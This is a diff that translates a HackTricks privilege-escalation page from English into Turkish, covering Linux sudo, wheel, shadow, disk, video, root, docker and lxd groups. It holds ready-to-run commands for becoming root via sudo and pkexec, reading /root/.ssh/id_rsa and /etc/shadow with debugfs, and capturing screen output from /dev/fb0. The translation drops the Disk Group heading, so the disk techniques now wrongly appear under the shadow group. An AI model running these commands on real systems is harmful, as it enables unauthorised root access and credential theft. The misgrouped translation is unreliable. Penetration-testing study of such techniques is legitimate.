@@ -1,18 +1,11 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+# Sudo/Admin Grupları
 
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+## **PE - Yöntem 1**
 
-# Sudo/Admin Groups
-
-## **PE - Method 1**
-
-**Sometimes**, **by default \(or because some software needs it\)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**Bazen**, **varsayılan olarak \(ya da bazı yazılımlar bunu gerektirdiği için\)** **/etc/sudoers** dosyası içinde bu satırlardan bazılarını bulabilirsiniz:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -20,48 +13,35 @@ Get Access Today:
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+Bu, **sudo veya admin grubuna ait olan herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Eğer durum böyleyse, **root olmak için sadece şunu çalıştırabilirsiniz**:
 ```text
 sudo su
 ```
+## PE - Yöntem 2
 
-## PE - Method 2
-
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+Tüm suid ikili dosyalarını bulun ve **Pkexec** ikili dosyasının olup olmadığını kontrol edin:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary pkexec is a SUID binary and you belong to sudo or admin, you could probably execute binaries as sudo using pkexec.  
-Check the contents of:
-
+Eğer pkexec ikili dosyasının SUID ikili dosyası olduğunu ve sudo veya admin grubuna ait olduğunuzu bulursanız, muhtemelen pkexec kullanarak ikili dosyaları sudo olarak çalıştırabilirsiniz. İçeriği kontrol edin:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+Orada **pkexec** komutunu çalıştırmaya izin verilen grupları bulacaksınız ve bazı Linux dağıtımlarında **varsayılan olarak** **sudo veya admin** gibi bazı gruplar **görünebilir**.
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux can **appear** some of the groups **sudo or admin**.
-
-To **become root you can execute**:
-
+**Root olmak için şunu çalıştırabilirsiniz**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+Eğer **pkexec** komutunu çalıştırmaya çalışırsanız ve bu **hata** ile karşılaşırsanız:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
-
+**Bu, izinlerinizin olmaması nedeniyle değil, bir GUI olmadan bağlı olmamanızdan kaynaklanıyor**. Bu sorun için bir çözüm burada mevcut: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumuna** ihtiyacınız var:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -72,39 +52,27 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
+# Wheel Grubu
 
-# Wheel Group
-
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+**Bazen**, **varsayılan olarak** **/etc/sudoers** dosyası içinde bu satırı bulabilirsiniz:
 ```text
 %wheel	ALL=(ALL:ALL) ALL
 ```
+Bu, **wheel grubuna ait olan herhangi bir kullanıcının sudo ile her şeyi çalıştırabileceği** anlamına gelir.
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+Eğer durum böyleyse, **root olmak için sadece şunu çalıştırabilirsiniz**:
 ```text
 sudo su
 ```
+# Shadow Grubu
 
-# Shadow Group
-
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+**shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+Bu ayrıcalık neredeyse **root erişimi ile eşdeğerdir** çünkü makinenin içindeki tüm verilere erişebilirsiniz.
 
-So, read the file and try to **crack some hashes**.
-
-# Disk Group
-
-This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
-
-Files:`/dev/sd[a-z][1-9]`
-
+Dosyalar:`/dev/sd[a-z][1-9]`
 ```text
 debugfs /dev/sda1
 debugfs: cd /root
@@ -112,70 +80,55 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+Debugfs kullanarak **dosya yazma** işlemi de yapabileceğinizi unutmayın. Örneğin, `/tmp/asd1.txt` dosyasını `/tmp/asd2.txt` dosyasına kopyalamak için şunu yapabilirsiniz:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
+Ancak, **root tarafından sahip olunan dosyaları yazmaya** çalışırsanız \(örneğin `/etc/shadow` veya `/etc/passwd`\) "**İzin reddedildi**" hatası alırsınız.
 
-However, if you try to **write files owned by root** \(like `/etc/shadow` or `/etc/passwd`\) you will have a "**Permission denied**" error.
+# Video Grubu
 
-# Video Group
-
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+`w` komutunu kullanarak **sistemde kimin oturum açtığını** bulabilirsiniz ve aşağıdaki gibi bir çıktı gösterecektir:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+**tty1**, kullanıcının **yossi'nin makinedeki bir terminale fiziksel olarak giriş yaptığını** ifade eder.
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+**video grubu**, ekran çıktısını görüntüleme erişimine sahiptir. Temelde ekranları gözlemleyebilirsiniz. Bunu yapmak için, ekranın **şu anki görüntüsünü** ham veri olarak almanız ve ekranın kullandığı çözünürlüğü öğrenmeniz gerekir. Ekran verileri `/dev/fb0`'da kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size`'da bulabilirsiniz.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:
+**Ham görüntüyü açmak için** **GIMP**'i kullanabilir, **`screen.raw`** dosyasını seçebilir ve dosya türü olarak **Ham görüntü verisi** seçebilirsiniz:
 
 ![](../../images/image%20%28208%29.png)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types \(and select the one that shows better the screen\):
+Sonra Genişlik ve Yüksekliği ekranda kullanılanlarla değiştirin ve farklı Görüntü Türlerini kontrol edin \(ve ekranı daha iyi göstereni seçin\):
 
 ![](../../images/image%20%28295%29.png)
 
-# Root Group
+# Root Grubu
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+Görünüşe göre varsayılan olarak **root grubunun üyeleri**, bazı **hizmet** yapılandırma dosyalarını veya bazı **kütüphane** dosyalarını veya ayrıcalıkları artırmak için kullanılabilecek **diğer ilginç şeyleri** **değiştirme** erişimine sahip olabilir...
 
-**Check which files root members can modify**:
-
+**Root üyelerinin hangi dosyaları değiştirebileceğini kontrol edin**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
+# Docker Grubu
 
-# Docker Group
-
-You can mount the root filesystem of the host machine to an instance’s volume, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
+Ana makinenin kök dosya sistemini bir örneğin hacmine monte edebilirsiniz, böylece örnek başladığında hemen o hacme `chroot` yükler. Bu, makinede size kök erişimi sağlar.
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-# lxc/lxd Group
+# lxc/lxd Grubu
 
-[lxc - Privilege Escalation](lxd-privilege-escalation.md)
+[lxc - Yetki Yükseltme](lxd-privilege-escalation.md)
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {{#include ../../banners/hacktricks-training.md}}
